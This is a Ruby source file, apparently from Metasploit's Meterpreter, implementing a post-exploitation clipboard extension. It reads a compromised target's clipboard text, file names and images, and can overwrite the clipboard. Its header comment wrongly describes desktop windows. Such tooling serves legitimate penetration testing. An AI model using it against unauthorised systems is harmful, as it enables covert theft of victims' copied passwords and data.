#!/usr/bin/env ruby
# -*- coding: binary -*-

module Rex
module Post
module Meterpreter
module Extensions
module Extapi
module Clipboard

###
#
# This meterpreter extension contains extended API functions for
# querying and managing desktop windows.
#
###
class Clipboard

  def initialize(client)
    @client = client
  end

  # Get the target clipboard data in whichever format we can
  # (if it's supported.
  def get_data()
    results = []

    request = Packet.create_request('extapi_clipboard_get_data')

    response = client.send_request(request)

    text = response.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT)

    if not text.nil?
      results << {
        :type => :text,
        :data => text
      }
    end

    files = response.get_tlv_values(TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE)

    files = []
    response.each(TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE) { |f|
      files << {
        :name => f.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME),
        :size => f.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_SIZE)
      }
    }

    if files.length > 0
      results << {
        :type => :files,
        :data => files
      }
    end

    jpg = response.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_JPG)

    if not jpg.nil?
      results << {
        :type => :jpg,
        :data => jpg
      }
    end

    return results
  end

  # Set the target clipboard data to a text value
  def set_text(text)
    request = Packet.create_request('extapi_clipboard_set_data')

    request.add_tlv(TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT, text)

    response = client.send_request(request)

    return true
  end

  attr_accessor :client

end

end; end; end; end; end; end
